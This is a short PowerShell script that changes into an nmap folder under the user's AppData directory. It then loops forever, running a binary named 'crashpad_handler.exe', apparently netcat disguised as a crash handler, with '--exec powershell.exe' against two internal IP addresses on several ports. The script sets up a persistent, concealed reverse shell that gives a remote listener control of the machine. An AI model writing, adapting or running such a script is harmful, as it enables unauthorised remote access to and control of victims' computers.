# change directory into nmap folder
Write-Output "Changing Directory"
Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
Write-Output "Directory Changed"

Write-Output "Connecting to listener"
for (;;)
{
# for ip 10.133.33.205
$ListenerIP = "10.133.33.205"
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 8888
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6969
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6699
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6996
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 9669

# for ip 10.133.61.215
$ListenerIP = "10.133.61.215"
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 8888
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6969
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6699
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6996
.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 9669
}